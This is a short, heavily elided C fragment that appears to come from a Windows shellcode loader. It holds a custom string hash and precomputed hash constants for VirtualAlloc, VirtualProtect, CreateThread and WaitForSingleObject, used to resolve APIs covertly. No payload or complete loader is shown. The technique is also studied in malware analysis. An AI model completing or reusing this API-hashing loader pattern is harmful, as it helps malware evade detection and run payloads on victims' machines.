...
uint32_t hash(const uint8_t *data, size_t len) {
    uint32_t hash_value = 0x8BADF00D; 
    ...
    for (size_t i = 0; i < len; i++) {
        ...
        hash_value = (hash_value * 33) + c_val;
    }
...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0x48C2695F;
    uint32_t h_VirtualProtect = 0x13E3D915;
    uint32_t h_CreateThread = 0xD8015219;
    uint32_t h_WaitForSingleObject = 0xF66521E2;
